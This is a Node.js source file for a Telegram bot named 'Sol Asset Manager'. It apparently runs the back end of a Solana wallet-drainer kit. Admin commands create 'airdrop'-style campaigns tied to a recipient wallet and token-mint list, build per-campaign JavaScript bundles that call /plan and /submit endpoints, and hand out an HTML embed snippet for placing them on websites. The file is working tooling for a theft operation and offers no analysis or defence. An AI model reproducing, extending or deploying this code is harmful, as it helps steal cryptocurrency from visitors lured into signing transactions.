import "dotenv/config";
import { generateBundle, HTML_SNIPPET, newCampaignSecret } from "./generate.js";
import { parseRecipients } from "./recipients.js";
import * as store from "./store.js";

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const APP_URL = process.env.APP_URL || "http://localhost:3000";
const DEFAULT_RECIPIENTS = (() => {
  try { return parseRecipients(process.env); } catch { return []; }
})();
const ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || "")
  .split(",").map((s) => s.trim()).filter(Boolean);

if (!TOKEN) {
  console.error("TELEGRAM_BOT_TOKEN is not set");
  process.exit(1);
}

const API = `https://api.telegram.org/bot${TOKEN}`;

async function tg(method, params) {
  const res = await fetch(`${API}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(params),
  });
  return res.json();
}

function send(chatId, text, parseMode = false) {
  const payload = { chat_id: chatId, text };
  if (parseMode) payload.parse_mode = "HTML";
  return tg("sendMessage", payload);
}

function isAdmin(chatId) {
  return ADMIN_IDS.length === 0 || ADMIN_IDS.includes(String(chatId));
}

async function sendDocument(chatId, filename, content) {
  const form = new FormData();
  form.append("chat_id", String(chatId));
  form.append("caption", filename);
  form.append("document", new Blob([content], { type: "text/javascript" }), filename);
  await fetch(`${API}/sendDocument`, { method: "POST", body: form });
}

function parseCreate(argLine) {
  const parts = argLine.split("|").map((s) => s.trim());
  if (parts.length < 2) return null;
  const [name, recipientRaw, modeRaw, liquidRaw] = parts;
  const recipient = recipientRaw || DEFAULT_RECIPIENTS[0] || "";
  if (!name || !recipient) return null;
  const mode = modeRaw === "manual" ? "manual" : "auto";
  const liquidMints = (liquidRaw || "").split(",").map((s) => s.trim()).filter(Boolean);
  return { name, recipient, mode, liquidMints };
}

function escapeHtml(value) {
  return value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

async function handleUpdate(update) {
  const message = update.message;
  if (!message || !message.text) return;
  const chatId = message.chat.id;
  const text = message.text;

  if (!isAdmin(chatId)) {
    await send(chatId, "Access denied.");
    return;
  }

  const [cmd, ...rest] = text.split(/\s+/);
  const argLine = rest.join(" ");

  if (cmd === "/start" || cmd === "/help") {
    await send(
      chatId,
      `<b>Sol Asset Manager</b>\n\n` +
        `<code>/newfile name|recipient|mode|liquidMints</code> — create a campaign\n` +
        `<code>/getfile id</code> — fetch the JS bundle\n` +
        `<code>/list</code> — list campaigns\n` +
        `<code>/stats id</code> — campaign details\n` +
        `<code>/delete id</code> — remove a campaign\n` +
        `<code>/snippet</code> — HTML embed snippet\n\n` +
        `Mode: <code>auto</code> (default) or <code>manual</code> (mint allowlist).\n` +
        `Example: <code>/newfile airdrop|RECIPIENT|auto</code>`,
      true,
    );
    return;
  }

  if (cmd === "/snippet") {
    await send(chatId, `<code>${escapeHtml(HTML_SNIPPET)}</code>`, true);
    return;
  }

  if (cmd === "/newfile") {
    const parsed = parseCreate(argLine);
    if (!parsed) {
      await send(chatId, "Usage: /newfile name|recipient|mode|liquidMints");
      return;
    }
    const id = `cmp_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`;
    const secret = newCampaignSecret();

    store.put(id, {
      name: parsed.name,
      recipient: parsed.recipient,
      mode: parsed.mode,
      liquidMints: parsed.liquidMints,
      secret,
      createdAt: new Date().toISOString(),
      createdBy: String(chatId),
      alt: null,
    });

    await send(
      chatId,
      `Campaign <b>${escapeHtml(parsed.name)}</b> (#${id}) created.\n\n` +
        `Get the JS: <code>/getfile ${id}</code>\n` +
        `Embed snippet: <code>/snippet</code>`,
      true,
    );
    return;
  }

  if (cmd === "/getfile") {
    const id = argLine.trim();
    const record = store.get(id);
    if (!record) return send(chatId, "Campaign not found.");
    const bundle = generateBundle({
      planEndpoint: `${APP_URL}/plan`,
      submitEndpoint: `${APP_URL}/submit`,
      recipients: [record.recipient],
      mode: record.mode,
      liquidMints: record.liquidMints,
      campaignId: id,
      secret: record.secret,
      brand: { name: record.name },
    });
    await sendDocument(chatId, `${id}.js`, bundle);
    return;
  }

  if (cmd === "/list") {
    const items = store.list();
    if (items.length === 0) return send(chatId, "No campaigns.");
    const lines = items
      .slice(-50)
      .map((c) => `#${c.id} — ${escapeHtml(c.name)} — ${c.mode} — ${c.recipient.slice(0, 8)}…`);
    await send(chatId, `<b>Campaigns</b>\n` + lines.join("\n"), true);
    return;
  }

  if (cmd === "/stats") {
    const id = argLine.trim();
    const record = store.get(id);
    if (!record) return send(chatId, "Campaign not found.");
    await send(
      chatId,
      `<b>#${id}</b>\n` +
        `Name: ${escapeHtml(record.name)}\n` +
        `Recipient: <code>${record.recipient}</code>\n` +
        `Mode: ${record.mode}\n` +
        `Mints: ${(record.liquidMints || []).length || "all"}\n` +
        `ALT: <code>${record.alt || "not set"}</code>\n` +
        `Created: ${record.createdAt}`,
      true,
    );
    return;
  }

  if (cmd === "/delete") {
    const id = argLine.trim();
    if (!store.get(id)) return send(chatId, "Campaign not found.");
    store.remove(id);
    await send(chatId, `Campaign #${id} deleted.`);
    return;
  }

  await send(chatId, "Unknown command. Send /help.");
}

async function main() {
  await fetch(`${API}/deleteWebhook?drop_pending_updates=true`).catch(() => {});
  console.log("[bot] polling started");
  let offset = 0;
  for (;;) {
    try {
      const res = await fetch(`${API}/getUpdates?timeout=25&offset=${offset}`);
      const data = await res.json();
      if (!data.ok) continue;
      for (const update of data.result) {
        offset = update.update_id + 1;
        handleUpdate(update).catch((err) => console.error("[bot] handle", err));
      }
    } catch (err) {
      console.error("[bot] poll", err.message);
      await new Promise((r) => setTimeout(r, 3000));
    }
  }
}

main();
